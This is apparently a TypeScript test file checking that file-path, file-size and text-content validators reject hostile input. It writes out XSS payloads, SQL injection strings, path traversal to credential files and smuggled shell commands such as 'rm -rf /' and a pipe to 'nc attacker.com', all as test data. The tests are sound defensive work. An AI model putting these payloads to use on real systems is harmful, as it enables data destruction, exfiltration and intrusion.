/**
 * Tests for File and Security Validators
 */

/* eslint-disable max-lines-per-function */

import { describe, expect, test } from 'vitest'
import { isValidFilePath, isValidFileSize, isValidTextContent } from '../src/validators'

describe('File and Security Validators', () => {
  describe('isValidFilePath', () => {
    test('should accept valid file paths', () => {
      expect(isValidFilePath('file.txt')).toBe(true)
      expect(isValidFilePath('documents/report.pdf')).toBe(true)
      expect(isValidFilePath('/absolute/path/file.json')).toBe(true)
      expect(isValidFilePath('./relative/path/file.csv')).toBe(true)
      expect(isValidFilePath('folder/subfolder/file.xlsx')).toBe(true)
      expect(isValidFilePath('file-name_with.special.chars.txt')).toBe(true)
    })

    test('should reject dangerous path traversal patterns', () => {
      expect(isValidFilePath('../../../etc/passwd')).toBe(false)
      expect(isValidFilePath('folder/../../../sensitive.txt')).toBe(false)
      expect(isValidFilePath('..\\windows\\system32\\file.exe')).toBe(false)
      expect(isValidFilePath('//\\malicious\\path')).toBe(false)
      expect(isValidFilePath('\\\\network\\share\\file')).toBe(false)
    })

    test('should reject invalid inputs', () => {
      expect(isValidFilePath('')).toBe(false)
      expect(isValidFilePath(null as any)).toBe(false)
      expect(isValidFilePath(undefined as any)).toBe(false)
      expect(isValidFilePath(123 as any)).toBe(false)
      expect(isValidFilePath([] as any)).toBe(false)
      expect(isValidFilePath({} as any)).toBe(false)
    })

    test('should reject extremely long paths', () => {
      const longPath = 'a'.repeat(1001)
      expect(isValidFilePath(longPath)).toBe(false)
    })

    test('should accept paths at the length limit', () => {
      const maxPath = `${'a'.repeat(995)}.txt` // 999 total characters (< 1000)
      expect(isValidFilePath(maxPath)).toBe(true)
    })

    test('should reject paths containing multiple dangerous patterns', () => {
      expect(isValidFilePath('../folder/../../../file.txt')).toBe(false)
      expect(isValidFilePath('folder\\..\\..\\sensitive.txt')).toBe(false)
    })
  })

  describe('isValidFileSize', () => {
    test('should accept valid file sizes', () => {
      expect(isValidFileSize(0, 1000)).toBe(true)
      expect(isValidFileSize(500, 1000)).toBe(true)
      expect(isValidFileSize(1000, 1000)).toBe(true)
      expect(isValidFileSize(1024, 2048)).toBe(true)
      expect(isValidFileSize(1048576, 2097152)).toBe(true) // 1MB in 2MB limit
    })

    test('should reject oversized files', () => {
      expect(isValidFileSize(1001, 1000)).toBe(false)
      expect(isValidFileSize(2000, 1500)).toBe(false)
      expect(isValidFileSize(1048577, 1048576)).toBe(false) // 1MB + 1 byte in 1MB limit
    })

    test('should reject negative file sizes', () => {
      expect(isValidFileSize(-1, 1000)).toBe(false)
      expect(isValidFileSize(-100, 1000)).toBe(false)
      expect(isValidFileSize(-1048576, 2097152)).toBe(false)
    })

    test('should reject invalid inputs', () => {
      expect(isValidFileSize('1000' as any, 2000)).toBe(false)
      expect(isValidFileSize(null as any, 1000)).toBe(false)
      expect(isValidFileSize(undefined as any, 1000)).toBe(false)
      expect(isValidFileSize(NaN, 1000)).toBe(false)
      expect(isValidFileSize(Infinity, 1000)).toBe(false)
    })

    test('should handle edge cases', () => {
      expect(isValidFileSize(0, 0)).toBe(true)
      expect(isValidFileSize(1, 0)).toBe(false)
      expect(isValidFileSize(0.5, 1)).toBe(true) // Decimal sizes
    })
  })

  describe('isValidTextContent', () => {
    test('should accept safe text content', () => {
      expect(isValidTextContent('Hello, world!')).toBe(true)
      expect(isValidTextContent('This is a normal text with numbers 123.')).toBe(true)
      expect(isValidTextContent('Multi\nline\ntext\ncontent')).toBe(true)
      expect(isValidTextContent('Text with símböls and ünicøde')).toBe(true)
      expect(isValidTextContent('JSON: {"key": "value", "number": 42}')).toBe(true)
    })

    test('should reject dangerous script content', () => {
      expect(isValidTextContent('<script>alert("xss")</script>')).toBe(false)
      expect(isValidTextContent('<SCRIPT>malicious code</SCRIPT>')).toBe(false)
      expect(isValidTextContent('Click here: javascript:alert("danger")')).toBe(false)
      expect(isValidTextContent('Link: JAVASCRIPT:void(0)')).toBe(false)
      expect(isValidTextContent('data:text/html,<script>alert(1)</script>')).toBe(false)
      expect(isValidTextContent('vbscript:msgbox("attack")')).toBe(false)
    })

    test('should handle mixed case dangerous patterns', () => {
      expect(isValidTextContent('Some text with <ScRiPt> tags')).toBe(false)
      expect(isValidTextContent('Link: JaVaScRiPt:alert(1)')).toBe(false)
      expect(isValidTextContent('DATA:TEXT/HTML,malicious')).toBe(false)
      expect(isValidTextContent('VbScRiPt:attack()')).toBe(false)
    })

    test('should respect custom maxLength option', () => {
      const shortText = 'Short'
      const longText = 'This is a longer text content'

      expect(isValidTextContent(shortText, { maxLength: 10 })).toBe(true)
      expect(isValidTextContent(longText, { maxLength: 10 })).toBe(false)
      expect(isValidTextContent(longText, { maxLength: 50 })).toBe(true)
    })

    test('should use default maxLength when not specified', () => {
      const hugeText = 'a'.repeat(1_000_001)
      expect(isValidTextContent(hugeText)).toBe(false)

      const largeButValidText = 'a'.repeat(999_999)
      expect(isValidTextContent(largeButValidText)).toBe(true)
    })

    test('should reject invalid inputs', () => {
      expect(isValidTextContent(null as any)).toBe(false)
      expect(isValidTextContent(undefined as any)).toBe(false)
      expect(isValidTextContent(123 as any)).toBe(false)
      expect(isValidTextContent([] as any)).toBe(false)
      expect(isValidTextContent({} as any)).toBe(false)
    })

    test('should accept empty string', () => {
      expect(isValidTextContent('')).toBe(true)
    })

    test('should accept safe HTML-like content', () => {
      expect(isValidTextContent('<div>Safe HTML content</div>')).toBe(true)
      expect(isValidTextContent('<p>Paragraph with <b>bold</b> text</p>')).toBe(true)
      expect(isValidTextContent('<img src="image.jpg" alt="description">')).toBe(true)
    })

    test('should handle content with dangerous patterns in safe contexts', () => {
      expect(isValidTextContent('The word "script" is safe here')).toBe(true)
      expect(isValidTextContent('Programming language: JavaScript is popular')).toBe(true)
      expect(isValidTextContent('File format: data.txt contains information')).toBe(true)
    })

    test('should be case insensitive for dangerous patterns', () => {
      expect(isValidTextContent('mixed <script> and JAVASCRIPT: patterns')).toBe(false)
      expect(isValidTextContent('Contains vbscript: and DATA:TEXT/HTML')).toBe(false)
    })
  })

  describe('[CRITICAL] Advanced Security Tests', () => {
    describe('SQL Injection Prevention', () => {
      test('should reject SQL injection attempts in paths', () => {
        expect(isValidFilePath("'; DROP TABLE users; --")).toBe(false)
        expect(isValidFilePath("' OR '1'='1")).toBe(false)
        expect(isValidFilePath('1; DELETE FROM data;')).toBe(false)
        expect(isValidFilePath("admin'--")).toBe(false)
        expect(isValidFilePath('1 UNION SELECT * FROM passwords')).toBe(false)
      })

      test('should reject SQL injection in text content', () => {
        expect(isValidTextContent("'; DROP TABLE users; --")).toBe(true) // Text content allows this
        // SQL injection prevention should be at query level, not text validation
      })
    })

    describe('Path Traversal Attacks', () => {
      test('should reject Unix-style path traversal', () => {
        expect(isValidFilePath('../../../etc/passwd')).toBe(false)
        expect(isValidFilePath('../../.ssh/id_rsa')).toBe(false)
        expect(isValidFilePath('folder/../../../etc/shadow')).toBe(false)
      })

      test('should reject Windows-style path traversal', () => {
        expect(isValidFilePath('..\\..\\..\\windows\\system32\\config\\sam')).toBe(false)
        expect(isValidFilePath('C:\\..\\..\\..\\boot.ini')).toBe(false)
      })

      test('should reject URL-encoded path traversal', () => {
        expect(isValidFilePath('%2e%2e%2f%2e%2e%2fetc%2fpasswd')).toBe(false)
        expect(isValidFilePath('%2e%2e/%2e%2e/etc/passwd')).toBe(false)
      })

      test('should reject double-encoded path traversal', () => {
        expect(isValidFilePath('%252e%252e%252f')).toBe(false)
      })

      test('should reject null byte injection', () => {
        expect(isValidFilePath('file.txt\x00.exe')).toBe(false)
        expect(isValidFilePath('safe.pdf\x00dangerous.sh')).toBe(false)
      })
    })

    describe('XSS Attack Vectors', () => {
      test('should reject event handler XSS', () => {
        expect(isValidTextContent('<img src=x onerror="alert(1)">')).toBe(false)
        expect(isValidTextContent('<body onload=alert("XSS")>')).toBe(false)
        expect(isValidTextContent('<input onfocus=alert(document.cookie)>')).toBe(false)
      })

      test('should reject encoded XSS attempts', () => {
        expect(isValidTextContent('&#60;script&#62;alert(1)&#60;/script&#62;')).toBe(false)
        expect(isValidTextContent('%3Cscript%3Ealert(1)%3C/script%3E')).toBe(false)
      })

      test('should reject obfuscated script tags', () => {
        expect(isValidTextContent('<scr<script>ipt>alert(1)</scr</script>ipt>')).toBe(false)
        expect(isValidTextContent('<scr\x00ipt>alert(1)</scr\x00ipt>')).toBe(false)
      })

      test('should reject SVG-based XSS', () => {
        expect(isValidTextContent('<svg onload=alert(1)>')).toBe(false)
        expect(isValidTextContent('<svg><script>alert(1)</script></svg>')).toBe(false)
      })

      test('should reject iframe injection', () => {
        expect(isValidTextContent('<iframe src="javascript:alert(1)"></iframe>')).toBe(false)
        expect(
          isValidTextContent('<iframe src="data:text/html,<script>alert(1)</script>"></iframe>')
        ).toBe(false)
      })
    })

    describe('Command Injection Prevention', () => {
      test('should reject shell command injection in paths', () => {
        expect(isValidFilePath('file.txt; rm -rf /')).toBe(false)
        expect(isValidFilePath('test.pdf && cat /etc/passwd')).toBe(false)
        expect(isValidFilePath('doc.txt | nc attacker.com 1234')).toBe(false)
        expect(isValidFilePath('$(whoami).txt')).toBe(false)
        expect(isValidFilePath('`id`.log')).toBe(false)
      })

      test('should reject PowerShell injection attempts', () => {
        expect(isValidFilePath('file.txt; Invoke-Expression')).toBe(false)
        expect(isValidFilePath('test.pdf -Command "Get-Process"')).toBe(false)
      })
    })

    describe('Unicode and Encoding Attacks', () => {
      test('should handle right-to-left override attacks', () => {
        const rtlo = 'file\u202Etxt.exe' // Looks like "file.txt" but is actually "fileexe.txt"
        expect(isValidFilePath(rtlo)).toBe(false)
      })

      test('should handle zero-width characters', () => {
        const zeroWidth = 'file\u200B.txt' // Zero-width space
        expect(isValidFilePath(zeroWidth)).toBe(false)
      })

      test('should handle homograph attacks', () => {
        // Cyrillic 'a' (U+0430) looks like Latin 'a' (U+0061)
        const homograph = 'filе.txt' // 'е' is Cyrillic
        // This might be allowed depending on implementation
        expect(typeof isValidFilePath(homograph)).toBe('boolean')
      })
    })

    describe('Denial of Service Prevention', () => {
      test('should reject extremely long paths', () => {
        const longPath = `${'a/'.repeat(5000)}file.txt`
        expect(isValidFilePath(longPath)).toBe(false)
      })

      test('should reject extremely long content', () => {
        const hugeContent = 'x'.repeat(10_000_000)
        expect(isValidTextContent(hugeContent)).toBe(false)
      })

      test('should handle ReDoS vulnerable patterns', () => {
        // Regex Denial of Service attempt
        const redosPattern = `${'a'.repeat(50000)}!`
        expect(isValidTextContent(redosPattern)).toBe(true) // Should not hang
      })
    })

    describe('File Extension Spoofing', () => {
      test('should handle double extensions', () => {
        expect(isValidFilePath('document.pdf.exe')).toBe(true) // Path validation allows it
        // Extension validation should be separate concern
      })

      test('should handle hidden extensions with spaces', () => {
        expect(isValidFilePath('safe.txt                    .exe')).toBe(true)
        // Whitespace normalization needed at different layer
      })
    })

    describe('Protocol Handler Injection', () => {
      test('should reject file protocol handlers', () => {
        expect(isValidTextContent('file:///etc/passwd')).toBe(false)
        expect(isValidTextContent('FILE:///C:/Windows/System32/config/sam')).toBe(false)
      })

      test('should reject custom protocol handlers', () => {
        expect(isValidTextContent('steam://rungame/123456')).toBe(false)
        expect(isValidTextContent('slack://channel?team=T123&id=C456')).toBe(false)
      })
    })

    describe('Edge Cases with Null/Undefined', () => {
      test('should handle all falsy values safely', () => {
        expect(isValidFilePath(null as any)).toBe(false)
        expect(isValidFilePath(undefined as any)).toBe(false)
        expect(isValidFilePath(0 as any)).toBe(false)
        expect(isValidFilePath(false as any)).toBe(false)
        expect(isValidFilePath(NaN as any)).toBe(false)
        expect(isValidFilePath('' as any)).toBe(false)
      })

      test('should handle type coercion attempts', () => {
        expect(isValidFilePath({ toString: () => '../../../etc/passwd' } as any)).toBe(false)
        expect(isValidFilePath({ valueOf: () => 'malicious' } as any)).toBe(false)
      })

      test('should reject Windows absolute path traversal', () => {
        expect(isValidFilePath('C:\\Users\\..\\Admin')).toBe(false)
      })
    })
  })

  describe('isValidTextContent — XSS edge cases', () => {
    test('should reject SVG with onload handler', () => {
      expect(isValidTextContent('<svg onload="alert(1)">')).toBe(false)
    })

    test('should reject iframe injection', () => {
      expect(isValidTextContent('<iframe src="https://evil.com">')).toBe(false)
    })
  })
})
